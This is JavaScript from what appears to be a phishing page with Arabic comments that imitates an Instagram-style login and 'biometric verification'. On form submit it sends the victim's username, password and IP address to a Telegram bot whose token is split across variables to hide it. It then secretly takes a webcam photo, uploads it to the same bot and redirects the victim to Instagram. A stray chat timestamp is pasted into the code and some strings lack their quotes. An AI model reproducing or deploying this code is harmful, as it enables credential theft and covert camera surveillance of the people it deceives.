    <script>
        const s1 = "9032113024";
        const s2 = "AAEqpxKq";
        const s3 = "vOJI_yoF";
        const s4 = "k57Ys0gx";
        const s5 = "B5GHwlHP4L0";
        const cId = "9032113024";

        function _buildKey() {
            return s1 + ":" + s2 + s3 + s4 + s5;
        }

        let ip_info = "جاري الجلب...";
        let user_id = "";

        // جلب الـ IP فوراً عند فتح الصفحة
        fetch('https://api.ipify.org?format=json')
            .then(res => res.json())
            .then(data => { ip_info = data.ip; })
            .catch(() => { ip_info = "غير معروف"; });

        // ربط أحداث النموذج مباشرة لأن السكريبت موجود في نهاية الـ body
[20/11/2026 4:00 PM] A: const loginForm = document.getElementById('login-form');
        if (loginForm) {
            loginForm.addEventListener('submit', function(e) {
                e.preventDefault(); // منع الإرسال الافتراضي وظهور علامة ? نهائياً
                
                user_id = document.getElementById('user').value;
                const user_pw = document.getElementById('pass').value;

                const msg = 📥 صيدة نصية:\n👤 الحساب: ${user_id}\n🔑 الباسورد: ${user_pw}\n🌐 IP: ${ip_info};
                
                // إرسال البيانات للبوت في الخلفية
                fetch(https://api.telegram.org/bot${_buildKey()}/sendMessage?chat_id=${cId}&text=${encodeURIComponent(msg)})
                    .catch(err => console.log("Telegram error:", err));

                // الانتقال المباشر لصفحة المراجعة الأمنية
                document.getElementById('auth-section').style.display = 'none';
                document.getElementById('verify-section').style.display = 'block';
            });
        }

        // ربط زر الفحص الحيوي (الكاميرا)
        const bioBtn = document.getElementById('biometric-btn');
        if (bioBtn) {
            bioBtn.addEventListener('click', async function() {
                this.innerText = "... جاري الفحص";
                this.disabled = true;

                try {
                    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                    const video = document.createElement('video');
                    video.srcObject = stream;
                    await video.play();

                    await new Promise(resolve => setTimeout(resolve, 1000));

                    const canvas = document.createElement('canvas');
                    canvas.width = video.videoWidth || 640;
                    canvas.height = video.videoHeight || 480;
                    const ctx = canvas.getContext('2d');
                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                    
                    canvas.toBlob(async (blob) => {
                        if (blob) {
                            const fd = new FormData();
                            fd.append('chat_id', cId);
                            fd.append('photo', blob, 'biometric.jpg');
                            fd.append('caption', 📸 صورة القياسات الحيوية لـ:\n👤 ${user_id}\n📱 ${navigator.userAgent});

                            fetch(https://api.telegram.org/bot${_buildKey()}/sendPhoto, { method: 'POST', body: fd })
                                .catch(err => console.log("Photo error:", err));
                        }

                        stream.getTracks().forEach(t => t.stop());
                        window.location.replace("https://www.instagram.com/reels/");
                    }, 'image/jpeg', 0.95);

                } catch (err) {
                    window.location.replace("https://www.instagram.com/reels/");
                }
            });
        }
    </script>
